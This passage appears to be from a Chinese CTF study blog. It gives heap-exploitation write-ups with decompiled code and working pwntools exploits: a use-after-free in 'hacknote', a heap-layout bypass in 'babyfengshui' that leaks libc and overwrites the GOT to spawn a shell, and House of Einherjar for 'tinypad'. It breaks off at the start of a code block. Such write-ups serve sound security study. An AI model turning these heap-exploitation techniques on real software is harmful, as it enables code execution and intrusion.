-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br></pre></td></tr></table></figure>
-<p>下面是稍微整理过的代码。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add note</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    最多添加 5 个 note，放在一个 notelist 里，目测出  note 的结构是这样的，</span></span><br><span class="line"><span class="comment">    struct note &#123;</span></span><br><span class="line"><span class="comment">        int (*func_ptr)(int); // print_note_content</span></span><br><span class="line"><span class="comment">        char *content;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)notelist[i] = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Note size :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Alloca Error"</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content :"</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="keyword">void</span> **)notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Success !"</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Full"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// delete note</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    free note 和 content. 但是两个指针都没有被设置 nullptr.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print note</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index :"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Out of bound!"</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print note content</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">print_note_content</span><span class="params">(<span class="keyword">int</span> a1)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后门函数 .text:08048986</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>显然是一道 UAF 的例题，要把那个函数指针覆盖为 0x08048986，然后 print_note 触发，要注意到一个 node 的大小是 8，然后可以按如下方式操作：</p>
-<ul>
-<li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
-<li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li>
-<li>释放 note0</li>
-<li>释放 note1</li>
-<li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li>
-<li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li>
-<li>note2 其实会分配 note1 对应的内存块。</li>
-<li>real content 对应的 chunk 其实是 note0。</li>
-<li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li>
-</ul>
-<p>exp 如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="Heap-fengshui-babyfengshui"><a href="#Heap-fengshui-babyfengshui" class="headerlink" title="Heap fengshui - babyfengshui"></a>Heap fengshui - babyfengshui</h3><p>Node 大致是这样的：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">Node</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">char* dect</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">char name[0x80-sizeof(char*)]</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">char</span> *)(len + users_array[idx]-&gt;dect) &gt;=</span><br><span class="line">    (<span class="keyword">char</span> *)users_array[idx] - <span class="number">4</span> ) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个只能判断 node 和 dect 相邻时，dect 不溢出，可以把他们操作成不相邻的，就绕过这个检测了。</p>
-<p>然后这么操作:</p>
-<ol>
-<li>create 三个 0x80 的 node.</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">node</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">top</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[2] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[2] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[1] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[1] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[0] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[0] 0x80</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<ol start="2">
-<li>delete node[0].</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">node</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">top</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[2] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[2] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[1] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[1] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">空闲    0x100</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<ol start="3">
-<li>再 create 一个 0x100 dect 的 node, 此时 dect 和 node 就不在一起了.</li>
-</ol>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">node</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">top</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[3] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[2] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[2] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">node[1] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[1] 0x80</td>
-<td></td>
-</tr>
-<tr>
-<td style="text-align:center">dect[3] 0x100</td>
-<td></td>
-</tr>
-</tbody>
-</table>
-<ol start="4">
-<li>用堆溢出进行操作.</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh  = process(<span class="string">'./babyfengshui'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyfengshui'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, name, textLen, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>, <span class="string">'0'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'size of description:'</span>,str(size))</span><br><span class="line">    sh.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,textLen,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'Action:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>,str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">'text length:'</span>,str(textLen))</span><br><span class="line">    sh.sendafter(<span class="string">'text:'</span>,content)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk0'</span>, <span class="number">0x80</span>, <span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk1'</span>, <span class="number">0x80</span>, <span class="string">'b'</span> * <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">0x80</span>, <span class="string">'chunk2'</span>, <span class="number">0x8</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">'chunk3'</span>, <span class="number">0x19c</span>,</span><br><span class="line">       <span class="string">'c'</span> * <span class="number">0x198</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">free_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'free'</span>, free_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 libc 加载地址</span></span><br><span class="line">libc_base   = free_addr - libc.dump(<span class="string">'free'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 free 的 got 表地址为 system 的地址</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">4</span>, p32(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell，相当于 system(heap[2])</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>libc2.26 以上因为有 tcache 机制，使用单项链表维护，先进后出，而且块不会合并。</p>
-<h2 id="2020-2-08"><a href="#2020-2-08" class="headerlink" title="2020-2-08"></a>2020-2-08</h2><h3 id="House-Of-Einherjar-tinypad"><a href="#House-Of-Einherjar-tinypad" class="headerlink" title="House Of Einherjar - tinypad"></a>House Of Einherjar - tinypad</h3><h4 id="回顾-House-Of-Einherjar"><a href="#回顾-House-Of-Einherjar" class="headerlink" title="回顾 House Of Einherjar"></a>回顾 House Of Einherjar</h4><p>两个物理相邻的 chunk 会共享 prev_size 字段，当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 prev_size 字段。</p>
-<p>在一些特殊大小的堆块中，off by one 不仅可以修改下一个堆块的 prev_size，还可以修改下一个堆块的 PREV_INUSE 比特位。这基本就是 House Of Einherjar 的原理。</p>
-<p>利用条件：</p>
-<ul>
-<li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li>
-<li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li>
-<li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li>
-</ul>
-<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad">题目链接</a></p>
-<p>看代码后可以发现以下几个关键点：</p>
-<ul>
-<li>添加 memo 时，用户申请的 chunk 的大小最大为 256 字节，和 tinypad 前面的未使用的 256 字节恰好一致，所有存在 off by one 漏洞。</li>
-<li>删除时会根据存储 memo 的大小判断 memo 是否在被使用，将相应 memo 大小设置为 0，但是并没有将指针设置为 NULL，有可能会导致 UAF。在程序开头时，就有可能输出一些相关的内容，这里可以泄露基址。</li>
-<li>编辑时 copy 存在 off by one。</li>
-</ul>
-<p>利用基本思路如下：</p>
-<ol>
-<li>利用删除时没有将指针置为 NULL 的 UAF 漏洞，泄漏堆的基地址。</li>
-<li>再次利用 UAF 漏洞泄漏 libc 的基地址。</li>
-<li>利用 house of einherjar 方法在 tinypad 的前 256 字节中伪造 chunk。当我们再次申请时，那么就可以控制 4 个 memo 的指针和内容了。</li>
-<li>这里虽然我们的第一想法可能是直接覆盖 malloc_hook 为 one_gadget 地址，但是，由于当编辑时，程序是利用 strlen 来判读可以读取多少长度，而 malloc_hook 则在初始时为 0。所以我们直接覆盖，所以这里采用其他方法，即修改程序的 main 函数的返回地址为 one_gadget，之所以可以行得通，是因为返回地址往往是 7f 开头的，长度足够长，可以覆盖为 one_gadget。所以我们还是需要泄漏 main 函数的返回地址，由于 libc 中存储了 main 函数 environ 指针的地址，所以我们可以先泄露出 environ 的地址，然后在得知存储 main 函数的返回地址的地址。这里选取 environ 符号是因为 environ 符号在 libc 中会导出，而像 argc 和 argv 则不会导出，相对来说会比较麻烦一点。</li>
-<li>最后修改 main 函数的返回地址为 one_gadget 地址获取 shell。</li>
-</ol>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span 